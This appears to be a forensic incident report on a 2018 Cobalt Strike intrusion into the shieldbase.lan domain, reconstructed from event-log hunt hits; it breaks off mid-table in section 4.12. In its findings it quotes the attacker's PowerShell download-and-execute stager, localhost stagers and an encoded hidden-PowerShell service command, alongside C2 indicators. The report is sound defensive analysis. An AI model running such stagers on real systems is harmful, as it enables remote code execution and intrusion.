# FINDEVIL — Comprehensive Incident Report
## Digital Forensics & Incident Response

| Field | Value |
|-------|-------|
| **Case** | FINDEVIL |
| **Domain** | shieldbase.lan |
| **Report Date** | 2026-06-13 (UTC) |
| **Evidence Scope** | base-rd-01-cdrive.E01, base-rd-02-cdrive.E01 |
| **Hunt Job** | 8f7cba50 (sole source for all findings) |
| **Classification** | RESTRICTED — DFIR Work Product |

---

## Table of Contents

1. Executive Summary
2. Evidence & Methodology
3. Threat Actor Profile
4. Findings — Chronological
   - 4.1 Pre-Domain Staging & Log Wipe (2018-05-04)
   - 4.2 Defender Disablement — Scripted & Persistent (2018-05-07 – 2018-06-01)
   - 4.3 Initial Access via RDP — Account tdungan (2018-07-11 – 2018-08-02)
   - 4.4 First Cobalt Strike Deployment — base-rd-01 (2018-08-28)
   - 4.5 Initial Lateral Sweep — RD Servers, File Server, AV (2018-08-28)
   - 4.6 Shellcode Stager & HTTP C2 Callback (2018-08-30)
   - 4.7 Nishang Interactive Shell — base-rd-01 (2018-08-30)
   - 4.8 Credential Theft — Overpass-the-Hash (2018-08-30T22:45Z)
   - 4.9 Workstation-Wide Lateral Movement (2018-08-30T22:33 – 2018-08-31T01:31Z)
   - 4.10 Cobalt Strike Deployment — base-rd-02 (2018-08-31T00:09Z)
   - 4.11 Nishang Interactive Shell — base-rd-02 (2018-08-31)
   - 4.12 Sustained Operator RDP Access — August–September 2018
   - 4.13 Domain Controller Targeting (2018-09-05)
   - 4.14 SMB Beacon Deployment & HTTP C2 Refresh (2018-09-06–07)
5. Attack Timeline
6. Indicators of Compromise
7. Gaps & Recommended Next Steps
8. Evidence Integrity

---

## 1. Executive Summary

This report documents a multi-month targeted intrusion into the shieldbase.lan Windows domain, based exclusively on Chainsaw Sigma-rule hunting (job `8f7cba50`) against forensic images of `base-rd-01` and `base-rd-02`. No findings from any other hunt job are included.

**A threat actor maintained persistent, operator-directed access to the shieldbase.lan domain from at least May 2018 through September 2018 — a minimum dwell time of 18 weeks.** The attack progressed through five distinct phases: pre-staging, initial access reconnaissance, Cobalt Strike deployment, domain-wide lateral movement, and sustained operation including targeting of the Domain Controller.

**Confirmed from evidence:**

- Windows Defender was disabled on both RD hosts 14 weeks before the first Cobalt Strike beacon, indicating pre-positioning or insider assistance
- The actor used account `tdungan` for RDP reconnaissance (July–August), then transitioned to `spsql` as the primary operator account for all active compromise activity
- Four Cobalt Strike beacons were deployed on rd-01 and two on rd-02, all via PSExec-style `\\127.0.0.1\ADMIN$` service installation as LocalSystem
- Two C2 channels were used: an HTTP beacon (C2 IP `206.189.69.35`, stager `squirreldirectory.com/a`) and an SMB named-pipe beacon (`\\.\pipe\diagsvc-22`)
- `spsql` used Overpass-the-Hash to obtain Kerberos credentials before the workstation sweep, making all subsequent lateral authentication appear as legitimate Kerberos logons
- EID 4648 explicit credential logons from rd-01 confirm `spsql` accessed base-file, all six RD servers, base-av, and all six workstations, as well as the Domain Controller
- The Domain Controller (`base-dc`, 172.16.4.4) was targeted with `Get-WmiObject Win32_ShadowCopy` and explicit credential logons on 2018-09-05, indicating potential ransomware preparation or backup destruction planning
- The last confirmed malicious event is 2018-09-07T04:24:57Z on base-rd-02 — the actor was still actively operational at image collection time

---

## 2. Evidence & Methodology

### 2.1 Evidence Items Analysed

| Image | Hostname | IP | Role |
|-------|----------|----|------|
| base-rd-01-cdrive.E01 | base-rd-01.shieldbase.lan | 172.16.6.11 | Remote Desktop host — primary pivot |
| base-rd-02-cdrive.E01 | base-rd-02.shieldbase.lan | 172.16.6.12 | Remote Desktop host — secondary pivot |

All images handled read-only throughout. No writes to `/cases/`, `/mnt/`, or `/media/`.

### 2.2 Hunt Job

| Job ID | Tool | Version | Scope | Hits | Rules Fired |
|--------|------|---------|-------|------|-------------|
| 8f7cba50 | Chainsaw | 2.16.0 | base-rd-01-cdrive.E01, base-rd-02-cdrive.E01 | 23,306 | 80 |

All 23,306 hits were produced from EVTX logs extracted from the two E01 images. Hit severity breakdown: 90 critical, 153 high, 813 medium, 311 low, 21,939 info.

### 2.3 Domain Network Map (derived from event log IpAddress fields in job 8f7cba50)

```
172.16.4.4   — base-dc.shieldbase.lan        (Domain Controller)
172.16.4.5   — base-file.shieldbase.lan       (File Server)
172.16.5.20  — base-av.shieldbase.lan         (AV / management host)
172.16.6.11  — base-rd-01.shieldbase.lan      (RD server — this evidence)
172.16.6.12  — base-rd-02.shieldbase.lan      (RD server — this evidence)
172.16.6.13  — base-rd-03.shieldbase.lan
172.16.6.14  — base-rd-04.shieldbase.lan      (spsql's RDP source — not imaged)
172.16.6.15  — base-rd-05.shieldbase.lan
172.16.6.16  — base-rd-06.shieldbase.lan
172.16.7.11  — base-wkstn-01.shieldbase.lan
172.16.7.12  — base-wkstn-02.shieldbase.lan
172.16.7.13  — base-wkstn-03.shieldbase.lan
172.16.7.14  — base-wkstn-04.shieldbase.lan
172.16.7.15  — BASE-WKSTN-05.shieldbase.lan
172.16.7.16  — BASE-WKSTN-06.shieldbase.lan
192.168.30.10 — Unknown (tdungan RDP source — not in evidence set)
```

---

## 3. Threat Actor Profile

| Attribute | Value | Source |
|-----------|-------|--------|
| Initial access account | `shieldbase\tdungan` | EID 4624 × 2 (hits 011237, 011568) |
| Operator account | `shieldbase\spsql` | EID 4697, 4624, 4648 throughout |
| spsql SID | S-1-5-21-3445421715-2530590580-3149308974-1193 | EID 4697 SubjectUserSid |
| tdungan source IP | 192.168.30.10 | EID 4624 IpAddress |
| Operator source (rd-01) | 172.16.6.14 (base-rd-04) | EID 4624 IpAddress |
| Operator source (rd-02) | 172.16.6.11 (base-rd-01) | EID 4624 IpAddress |
| Offensive tools | Cobalt Strike, Nishang PS framework | EID 4103/4104 ScriptBlock payloads |
| CS deployment method | PSExec-style `\\127.0.0.1\ADMIN$` | EID 7045 ImagePath |
| HTTP C2 stager | `http://squirreldirectory.com/a` | EID 4104 ScriptBlockText (hit 019132 et al) |
| HTTP C2 IP | `206.189.69.35` | Decoded shellcode bytes (hits 019876, 022965) |
| SMB C2 pipe | `\\.\pipe\diagsvc-22` | Decoded shellcode bytes (hits 022786, 023210) |
| HTTP beacon User-Agent | Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MATP; MATP) | Decoded shellcode (hit 019876) |
| Shellcode loader | `func_get_proc_address` / `VirtualAlloc` reflective PS DLL injection | EID 4103 Payload (all Bad Opsec hits) |

---

## 4. Findings — Chronological

---

### 4.1 Pre-Domain Staging & Log Wipe (2018-05-04T22:14:29Z)

**Both hosts | Critical**

Both RD hosts had their Security audit log (EID 1102) and System log (EID 104) cleared simultaneously. The `System.Computer` field in all events reads `win10-test` — the pre-domain-join hostname — confirming this occurred during initial host provisioning, before the machines entered the shieldbase.lan domain. The identical timestamps across both images indicate a scripted wipe applied to both hosts simultaneously.

| Hit ID | Sev | EID | Rule | Image |
|--------|-----|-----|------|-------|
| 8f7cba50-000029 | critical | 1102 | Security Audit Logs Cleared | rd-01 |
| 8f7cba50-000026 | critical | 1102 | Security Audit Logs Cleared | rd-02 |
| 8f7cba50-000022 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000023 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000027 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000028 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000032 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000033 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000020 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000021 | high | 104 | Important Windows Eventlog Cleared | rd-02 |
| 8f7cba50-000024 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000025 | high | 104 | Important Windows Eventlog Cleared | rd-02 |
| 8f7cba50-000030 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000031 | high | 104 | Important Windows Eventlog Cleared | rd-02 |

---

### 4.2 Defender Disablement — Scripted & Persistent (2018-05-07 – 2018-06-01)

**Both hosts | High**

Windows Defender was disabled in three waves across both hosts, beginning 14 weeks before the first Cobalt Strike beacon.

#### Wave 1 — Pre-domain name (2018-05-07T19:24:23Z)

Both hosts still named `win10-test`. Defender threat detection and malware scanning disabled with a 2-second offset between the two images (rd-02 at 19:24:23Z, rd-01 at 19:24:25Z), confirming scripted simultaneous execution.

| Hit ID | EID | Timestamp | Image |
|--------|-----|-----------|-------|
| 8f7cba50-000044 | 5010 | 2018-05-07T19:24:23Z | rd-02 |
| 8f7cba50-000045 | 5010 | 2018-05-07T19:24:23Z | rd-02 |
| 8f7cba50-000047 | 5010 | 2018-05-07T19:24:25Z | rd-01 |
| 8f7cba50-000048 | 5010 | 2018-05-07T19:24:25Z | rd-01 |

*Note: System.Computer = `win10-test` in all four events. Attribution to rd-01/rd-02 is via EVTX file path within each E01 image.*

#### Wave 2 — Full disable, both hosts (2018-05-09T14:47–14:49Z)

Post-domain-join. Virus scanning, threat detection, and malware/PUA scanning all disabled. rd-02 fires at 14:47:57Z, rd-01 four seconds later at 14:48:01Z. A second identical round fires two minutes later on both hosts (14:49:50Z / 14:49:52Z).

| Hit IDs | EID | Timestamp | Image |
|---------|-----|-----------|-------|
| 8f7cba50-000399–000402 | 5010/5012 | 2018-05-09T14:47:57Z | rd-02 |
| 8f7cba50-000403–000406 | 5010/5012 | 2018-05-09T14:48:01Z | rd-01 |
| 8f7cba50-000439–000442 | 5010/5012 | 2018-05-09T14:49:50Z | rd-02 |
| 8f7cba50-000445–000448 | 5010/5012 | 2018-05-09T14:49:52Z | rd-01 |

#### Wave 3 — Recurring daily re-disable on rd-02 (2018-05-30 – 2018-06-01)

rd-02 only. Defender disabled at approximately the same time each morning, consistent with a scheduled task or startup script that re-disables protection after each overnight restart. rd-01 has no equivalent events in this window.

| Hit IDs | EID | Timestamp |
|---------|-----|-----------|
| 8f7cba50-006394–006397 | 5010/5012 | 2018-05-30T02:40:53Z |
| 8f7cba50-007618–007621 | 5010/5012 | 2018-05-31T02:30:46Z |
| 8f7cba50-008669–008672 | 5010/5012 | 2018-06-01T02:42:01Z |

---

### 4.3 Initial Access via RDP — Account tdungan (2018-07-11 – 2018-08-02)

**base-rd-01 | Critical**

The account `shieldbase\tdungan` conducted 16 confirmed RDP sessions to base-rd-01 from `192.168.30.10` over a 22-day window. Two sessions have EID 4624 logon records confirming the username and authentication method:

| Hit ID | EID | Timestamp | User | Source IP | LogonType | AuthPkg |
|--------|-----|-----------|------|-----------|-----------|---------|
| 8f7cba50-011237 | 4624 | 2018-07-18T15:07:49Z | tdungan | 192.168.30.10 | 10 (RemoteInteractive) | Negotiate |
| 8f7cba50-011568 | 4624 | 2018-07-26T03:43:59Z | tdungan | 192.168.30.10 | 10 (RemoteInteractive) | Negotiate |

The remaining 30 critical hits are EID 24 (session disconnected) and EID 25 (session reconnected) entries bracketing each session:

`8f7cba50-010868/070`, `011111/114`, `011227/229/230/232/238/246`, `011344/351`, `011468/475/476/478`, `011569/580/581/585/587/592`, `011680/686`, `011797/802`, `011857/863`, `011911/917`

The session on 2018-07-26T03:43Z (off-hours) is particularly notable. The last tdungan session (2018-08-02) precedes the first Cobalt Strike beacon by 26 days, consistent with a reconnaissance phase followed by transition to the spsql operator account for active compromise.

---

### 4.4 First Cobalt Strike Deployment — base-rd-01 (2018-08-28T00:57 – 2018-08-30T16:42Z)

**base-rd-01 | Critical**

Four Cobalt Strike beacons installed as demand-start LocalSystem services via `\\127.0.0.1\ADMIN$`. Each is confirmed by both EID 7045 (System.evtx) and a corresponding EID 4697 (Security.evtx) with `SubjectUserName: spsql`.

| Hit ID (7045) | Hit ID (4697) | Timestamp | Service Name | Binary |
|---------------|---------------|-----------|-------------|--------|
| 8f7cba50-018926 | 8f7cba50-018929 | 2018-08-28T00:57:32Z | 56e3de4 | `\\127.0.0.1\ADMIN$\8f14386.exe` |
| 8f7cba50-018936 | 8f7cba50-018940 | 2018-08-28T01:05:03Z | 9c3ae67 | `\\127.0.0.1\ADMIN$\e75f2c4.exe` |
| 8f7cba50-018951 | 8f7cba50-018955 | 2018-08-28T01:09:03Z | 24f8f7e | `\\127.0.0.1\ADMIN$\3795920.exe` |
| 8f7cba50-019943 | 8f7cba50-019946 | 2018-08-30T16:42:44Z | fb9f33e | `\\127.0.0.1\ADMIN$\35da1b7.exe` |

High-severity companion hits (Suspicious Service Installation): `8f7cba50-018925`, `018935`, `018950`, `019942`.

Three beacons in 12 minutes (00:57–01:09Z) is consistent with Cobalt Strike's default retry behaviour when a staged payload does not check in. The fourth beacon 40 hours later (Aug 30, 16:42Z) reflects the actor re-staging after the initial beacons lapsed.

**Post-beacon PowerShell shellcode (2018-08-28T15:42Z):**

Approximately 15 hours after the first three beacons, EID 4104 (ScriptBlock logging) recorded shellcode execution. Hit `8f7cba50-019132` contains the plaintext stager:

```
IEX ((new-object net.webclient).downloadstring('http://squirreldirectory.com/a'))
```

| Hit ID | EID | Timestamp | Rule |
|--------|-----|-----------|------|
| 8f7cba50-019132 | 4104 | 2018-08-28T15:42:38Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-019137 | 4104 | 2018-08-28T15:42:39Z | PowerShell ShellCode |
| 8f7cba50-019144 | 4104 | 2018-08-28T15:42:56Z | PowerShell ShellCode |

**spsql RDP to rd-01 post-beacon (2018-08-28T21:39Z):**

| Hit ID | EID | Timestamp | Notes |
|--------|-----|-----------|-------|
| 8f7cba50-019280 | 4624 | 2018-08-28T21:39:08Z | spsql, 172.16.6.14, LogonType 10 |
| 8f7cba50-019282 | 4624 | 2018-08-28T21:39:08Z | spsql, linked elevated token |
| 8f7cba50-019323 | 24 | 2018-08-28T22:10:15Z | Session disconnected |

**Post-4th-beacon shellcode (2018-08-30T16:43Z):**

| Hit ID | EID | Timestamp | Rule |
|--------|-----|-----------|------|
| 8f7cba50-019961 | 4104 | 2018-08-30T16:43:40Z | PowerShell ShellCode |
| 8f7cba50-019968 | 4104 | 2018-08-30T16:43:51Z | PowerShell ShellCode |

---

### 4.5 Initial Lateral Sweep — RD Servers, File Server, AV (2018-08-28T22:08 – 22:43Z)

**Origin: base-rd-01 | Medium**

Beginning 22 minutes after the spsql RDP session at 21:39Z, EID 4648 (explicit credential logon — "Suspicious Remote Logon with Explicit Credentials") records show `spsql` authenticating to every major server in the environment from rd-01. This is the first lateral movement event and establishes the full breadth of network access available to the actor from rd-01.

| Hit ID | Timestamp | Target Server | Target IP |
|--------|-----------|--------------|-----------|
| 8f7cba50-019319 | 2018-08-28T22:08:24Z | base-file.shieldbase.lan | 172.16.4.5 |
| 8f7cba50-019346 | 2018-08-28T22:16:14Z | base-rd-02.shieldbase.lan | 172.16.6.12 |
| 8f7cba50-019351 | 2018-08-28T22:16:20Z | base-rd-03.shieldbase.lan | 172.16.6.13 |
| 8f7cba50-019352 | 2018-08-28T22:16:21Z | base-rd-04.shieldbase.lan | 172.16.6.14 |
| 8f7cba50-019353 | 2018-08-28T22:16:21Z | BASE-RD-05.shieldbase.lan | 172.16.6.15 |
| 8f7cba50-019356 | 2018-08-28T22:16:37Z | BASE-RD-06.shieldbase.lan | 172.16.6.16 |
| 8f7cba50-019357 | 2018-08-28T22:17:45Z | BASE-RD-06.shieldbase.lan | 172.16.6.16 |
| 8f7cba50-019365 | 2018-08-28T22:43:59Z | base-av.shieldbase.lan | 172.16.5.20 |

All events: `SubjectUserName: spsql`, `TargetUserName: spsql`, LogonType 9 (NewCredentials / Overpass-the-Hash style). The sweep covered the file server, all five other RD servers, and the AV management host within 35 minutes. The actor reconnected to BASE-RD-06 twice, suggesting initial access succeeded on the second attempt.

---

### 4.6 Shellcode Stager & HTTP C2 Callback (2018-08-30T13:51Z)

**base-rd-01 | Critical**

At 13:51:28Z on 2018-08-30, EID 4103 (PS module logging) captured the full reflective DLL injection payload under `spsql`. This is the most forensically complete capture of the actor's toolchain.

**Hit:** `8f7cba50-019876` — "Bad Opsec Powershell Code Artifacts" — Critical  
**EventID:** 4103 | **Computer:** base-rd-01.shieldbase.lan

The EID 4103 Payload contains a `func_get_proc_address` / `VirtualAlloc` / shellcode-copy-and-execute loader (PS reflective DLL injection). The embedded base64 shellcode block (798 bytes decoded) contains:

| Embedded String | Purpose |
|-----------------|---------|
| `206.189.69.35` | C2 beacon IP |
| `User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MATP; MATP)` | HTTP profile masquerading as Internet Explorer 9 |

The `start-job { IEX $a } -RunAs32` wrapper forces 32-bit execution inside the 64-bit PowerShell host — a known technique to ensure Cobalt Strike beacon compatibility.

---

### 4.7 Nishang Interactive Shell — base-rd-01 (2018-08-30T18:31Z + 21:40Z)

**base-rd-01 | High**

Between the shellcode callback and the credential theft event, the actor ran the Nishang offensive PowerShell framework in two distinct bursts, indicating an interactive reverse shell operating alongside the CS HTTP beacon. Multiple hits in both bursts contain `squirreldirectory.com/a` in their ScriptBlockText, confirming the Nishang sessions were delivered via the same stager.

**Burst 1 (18:31Z) — 10 hits:**

| Hit ID | EID | Timestamp | Rule |
|--------|-----|-----------|------|
| 8f7cba50-019997 | 4104 | 2018-08-30T18:31:07Z | Suspicious PS Invocations - Specific |
| 8f7cba50-019999 | 4104 | 2018-08-30T18:31:09Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020000 | 4104 | 2018-08-30T18:31:09Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020001 | 4104 | 2018-08-30T18:31:09Z | Suspicious PS Invocations - Generic |
| 8f7cba50-020003 | 4104 | 2018-08-30T18:31:09Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020004 | 4104 | 2018-08-30T18:31:09Z | Suspicious PS Invocations - Generic |
| 8f7cba50-020010 | 4104 | 2018-08-30T18:31:17Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020012 | 4104 | 2018-08-30T18:31:18Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020013 | 4104 | 2018-08-30T18:31:18Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020014 | 4104 | 2018-08-30T18:31:18Z | Suspicious PS Invocations - Generic |

**Burst 2 (21:40Z) — 8 hits:**

| Hit ID | EID | Timestamp | Rule |
|--------|-----|-----------|------|
| 8f7cba50-020060 | 4104 | 2018-08-30T21:40:20Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020062 | 4104 | 2018-08-30T21:40:21Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020063 | 4104 | 2018-08-30T21:40:21Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020064 | 4104 | 2018-08-30T21:40:21Z | Suspicious PS Invocations - Generic |
| 8f7cba50-020068 | 4104 | 2018-08-30T21:40:43Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020070 | 4104 | 2018-08-30T21:40:43Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020071 | 4104 | 2018-08-30T21:40:43Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020072 | 4104 | 2018-08-30T21:40:43Z | Suspicious PS Invocations - Generic |

Medium-severity "Suspicious Get-WmiObject" hits co-fire at these timestamps (`8f7cba50-020002`, `020005`, `020015`, `020065`, `020073`), indicating the actor was enumerating the environment via WMI within the Nishang session.

---

### 4.8 Credential Theft — Overpass-the-Hash (2018-08-30T22:45:25Z)

**base-rd-01 | High**

At 22:45:25Z, EID 4624 triggered the Sigma rule "Successful Overpass the Hash Attempt." This event fires exactly 4 seconds before the first EID 4648 workstation lateral move begins (22:45:29Z).

**Hit:** `8f7cba50-020102`

Key EID 4624 fields from source data:

| Field | Value |
|-------|-------|
| LogonType | 9 (NewCredentials / `runas /netonly`) |
| LogonProcessName | seclogo |
| AuthenticationPackageName | Negotiate |
| SubjectUserName | spsql |
| TargetUserName | spsql |
| IpAddress | ::1 (loopback) |
| ProcessName | C:\Windows\System32\svchost.exe |
| ElevatedToken | Yes |

LogonType 9 combined with `seclogo` as the logon process and loopback source is the canonical Overpass-the-Hash signature: the actor injected a stolen NTLM hash to silently obtain a Kerberos TGT. All subsequent lateral authentications appear as legitimate Kerberos logons with no NTLM hash traversing the network — rendering passive network monitoring ineffective for detecting these moves.

Follow-on PS invocation at 22:45:28Z: `8f7cba50-020106`

---

### 4.9 Workstation-Wide Lateral Movement (2018-08-30T22:33Z – 2018-08-31T01:31Z)

**Origin: base-rd-01 | Medium**

EID 4648 ("Suspicious Remote Logon with Explicit Credentials") records document `spsql` systematically authenticating to all six workstations and continuing to spread to rd-05 and wkstn-05 across nearly three hours.

**Note:** Some EID 4648 hits in this finding precede the OPtH event at 22:45Z by 12 minutes (starting at 22:33Z), indicating the actor began spreading to workstations using previously obtained credentials, then performed OPtH mid-sweep to obtain Kerberos material for broader access.

#### Initial sweep — all 6 workstations (22:33–22:45Z)

| Hit ID | Timestamp | Target |
|--------|-----------|--------|
| 8f7cba50-020089 | 2018-08-30T22:33:25Z | base-wkstn-03.shieldbase.lan (172.16.7.13) |
| 8f7cba50-020090 | 2018-08-30T22:33:38Z | base-wkstn-04.shieldbase.lan (172.16.7.14) |
| 8f7cba50-020091 | 2018-08-30T22:33:46Z | BASE-WKSTN-05.shieldbase.lan (172.16.7.15) |
| 8f7cba50-020092 | 2018-08-30T22:33:46Z | BASE-WKSTN-06.shieldbase.lan (172.16.7.16) |
| 8f7cba50-020093 | 2018-08-30T22:34:09Z | base-wkstn-01.shieldbase.lan (172.16.7.11) |
| 8f7cba50-020094 | 2018-08-30T22:38:02Z | base-wkstn-01 (repeat) |
| 8f7cba50-020095 | 2018-08-30T22:38:02Z | base-wkstn-02.shieldbase.lan (172.16.7.12) |
| 8f7cba50-020096 | 2018-08-30T22:38:02Z | base-wkstn-03 (repeat) |
| 8f7cba50-020097 | 2018-08-30T22:38:02Z | base-wkstn-04 (repeat) |
| 8f7cba50-020098 | 2018-08-30T22:38:02Z | BASE-WKSTN-05 (repeat) |
| 8f7cba50-020099 | 2018-08-30T22:38:02Z | BASE-WKSTN-06 (repeat) |
| 8f7cba50-020108 | 2018-08-30T22:45:29Z | base-wkstn-03 (post-OPtH) |
| 8f7cba50-020109 | 2018-08-30T22:45:29Z | base-wkstn-03 |
| 8f7cba50-020110 | 2018-08-30T22:45:29Z | base-wkstn-03 |

#### Continued spread — wkstn-02, then rd-02 beacon prep (00:06–00:08Z)

| Hit ID | Timestamp | Target |
|--------|-----------|--------|
| 8f7cba50-020130 | 2018-08-31T00:06:58Z | base-wkstn-02 |
| 8f7cba50-020131 | 2018-08-31T00:06:58Z | base-wkstn-02 |
| 8f7cba50-020132 | 2018-08-31T00:06:58Z | base-wkstn-02 |
| 8f7cba50-020142 | 2018-08-31T00:08:48Z | base-rd-02.shieldbase.lan (stager delivery) |
| 8f7cba50-020144 | 2018-08-31T00:08:48Z | base-rd-02 |
| 8f7cba50-020146 | 2018-08-31T00:08:48Z | base-rd-02 |

#### Post-rd-02 continued spread — wkstn-05 and rd-05 (00:50–01:31Z)

| Hit IDs | Timestamp range | Targets |
|---------|----------------|---------|
| 8f7cba50-020355–020360 | 00:50–00:54Z | BASE-WKSTN-05 (6 hits) |
| 8f7cba50-020366–020368 | 00:55Z | BASE-RD-05 |
| 8f7cba50-020374 | 00:57Z | BASE-RD-05 |
| 8f7cba50-020376 | 01:00Z | BASE-RD-05 |
| 8f7cba50-020379 | 01:07Z | BASE-WKSTN-05 |
| 8f7cba50-020381 | 01:08Z | BASE-RD-05 |
| 8f7cba50-020383 | 01:09Z | BASE-WKSTN-05 |
| 8f7cba50-020385–020387 | 01:13Z | BASE-WKSTN-05 (3 hits) |
| 8f7cba50-020393–020395 | 01:14Z | BASE-WKSTN-05 (3 hits) |
| 8f7cba50-020402–020404 | 01:23Z | BASE-WKSTN-05 (3 hits) |
| 8f7cba50-020409–020411 | 01:31Z | BASE-WKSTN-05 (3 hits) |

**Localhost IEX stagers (00:55–01:31Z):**  
The high-severity PS hits `8f7cba50-020364`, `020391`, `020400`, `020407` contain ScriptBlock text of the form `IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:<PORT>/'))` — localhost ports served by the CS beacon on rd-01 as staging payloads for each remote target. These are the PS loading sequences delivered to each workstation via the lateral move.

---

### 4.10 Cobalt Strike Deployment — base-rd-02 (2018-08-31T00:08–00:09Z)

**base-rd-02 | Critical**

Two beacons deployed 30 seconds apart, immediately following the EID 4648 rd-02 credential logon at 00:08:48Z.

| Hit ID | Sev | EID | Timestamp | Service | Binary / Command |
|--------|-----|-----|-----------|---------|-----------------|
| 8f7cba50-020156 | high | 4104 | 00:08:50Z | — | PS ShellCode (stager arriving) |
| 8f7cba50-020163 | high | 4104 | 00:09:00Z | — | PS ShellCode |
| 8f7cba50-020173 | **crit** | 7045 | 00:09:13Z | df0398a | `\\127.0.0.1\ADMIN$\5b1b72b.exe` |
| 8f7cba50-020172 | high | 7045 | 00:09:13Z | df0398a | Suspicious Service Installation |
| 8f7cba50-020176 | high | 4697 | 00:09:13Z | df0398a | CS Service — Security (spsql) |
| 8f7cba50-020179 | **crit** | 7045 | 00:09:43Z | 8556ce1 | `%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand <base64>` |
| 8f7cba50-020181 | high | 7045 | 00:09:43Z | 8556ce1 | PowerShell Scripts Installed as Services |
| 8f7cba50-020182 | high | 7045 | 00:09:43Z | 8556ce1 | Suspicious Service Installation |
| 8f7cba50-020184 | **crit** | 7045 | 00:09:43Z | 8556ce1 | CS Service Installations - System |
| 8f7cba50-020188 | high | 4697 | 00:09:43Z | 8556ce1 | PS Scripts as Services - Security |
| 8f7cba50-020190 | high | 4697 | 00:09:43Z | 8556ce1 | CS Service Installations - Security |
| 8f7cba50-020197 | high | 4104 | 00:09:45Z | — | PS ShellCode |
| 8f7cba50-020202 | high | 4104 | 00:09:45Z | — | PS ShellCode |

The second beacon (8556ce1) uses a PS-encoded Cobalt Strike stager running in a hidden minimised window — a memory-only beacon with no binary on disk outside the ADMIN$ staging share.

**spsql RDP to rd-02 from rd-01 (00:17–00:44Z):**

| Hit ID | EID | Timestamp | Notes |
|--------|-----|-----------|-------|
| 8f7cba50-020232 | 4624 | 00:17:04Z | spsql, 172.16.6.11, LogonType 10 |
| 8f7cba50-020234 | 4624 | 00:17:04Z | linked elevated token |
| 8f7cba50-020280 | 24 | 00:37:44Z | Session disconnected |
| 8f7cba50-020283 | 4624 | 00:41:44Z | spsql, second session |
| 8f7cba50-020285 | 4624 | 00:41:44Z | linked elevated token |
| 8f7cba50-020351 | 24 | 00:44:37Z | Session disconnected |

Source IP `172.16.6.11` confirms the actor pivoted interactively to rd-02 from within rd-01 using the OPtH Kerberos material.

**Companion EID 4648 for rd-02 service installs (00:09Z):**

| Hit IDs | Timestamp | Notes |
|---------|-----------|-------|
| 8f7cba50-020171 | 00:09:13Z | Suspicious Remote Logon with Explicit Credentials → BASE-RD-02 |
| 8f7cba50-020187 | 00:09:43Z | Suspicious Remote Logon with Explicit Credentials → BASE-RD-02 |

---

### 4.11 Nishang Interactive Shell — base-rd-02 (2018-08-31T00:21–00:44Z)

**base-rd-02 | High**

Three bursts of Nishang PS activity on rd-02 overlapping with the spsql RDP sessions. Multiple hits contain `squirreldirectory.com/a` in ScriptBlockText, confirming the same stager was used.

**Burst 1 (00:21–22Z):** `8f7cba50-020254`, `020260`, `020266`

**Burst 2 (00:42–43Z):** `8f7cba50-020301`, `020304`, `020307`, `020313`, `020319`

**Burst 3 (00:44Z):**

| Hit ID | EID | Timestamp | Rule |
|--------|-----|-----------|------|
| 8f7cba50-020325 | 4104 | 00:44:06Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020327 | 4104 | 00:44:08Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020328 | 4104 | 00:44:08Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020329 | 4104 | 00:44:08Z | Suspicious PS Invocations - Generic |
| 8f7cba50-020331 | 4104 | 00:44:08Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020332 | 4104 | 00:44:08Z | Suspicious PS Invocations - Generic |
| 8f7cba50-020341 | 4104 | 00:44:25Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020343 | 4104 | 00:44:25Z | Suspicious PS Invocations - Specific |
| 8f7cba50-020344 | 4104 | 00:44:25Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020345 | 4104 | 00:44:25Z | Suspicious PS Invocations - Generic |

---

### 4.12 Sustained Operator RDP Access — August–September 2018

**base-rd-01 | Critical**

#### Aug 31 daytime RDP to rd-01 from base-rd-04 (172.16.6.14)

Four sessions in the afternoon following the overnight beacon deployment and lateral movement sweep:

| Hit IDs | EID | Timestamp | Notes |
|---------|-----|-----------|-------|
| 8f7cba50-020566/568 | 4624 | 14:52:13Z | spsql, 172.16.6.14 |
| 8f7cba50-020587 | 24 | 14:58:38Z | Disconnected |
| 8f7cba50-020595/597 | 4624 | 15:21:30Z | spsql, 172.16.6.14 |
| 8f7cba50-020614 | 24 | 15:28:53Z | Disconnected |
| 8f7cba50-020689/691 | 4624 | 18:28:23Z | spsql, 172.16.6.14 |
| 8f7cba50-020705 | 24 | 18:31:07Z | Disconnected |
| 8f7cba50-020709/711 | 4624 | 18:34:05Z | spsql, 172.16.6.14 |
| 8f7cba50-020712 | 25 | 18:34:06Z | Session connected |
| 8f7cba50-020726 | 24 | 18:49:22Z | Disconnected |

#### Sep 5 — 8 RDP sessions to rd-01, spanning ~7 hours

The highest single-day operator activity observed. All sessions from 172.16.6.14. Immediately precedes the renewed shellcode activity and DC targeting on Sep 5–6.

| Hit IDs | Timestamp | Disconnect |
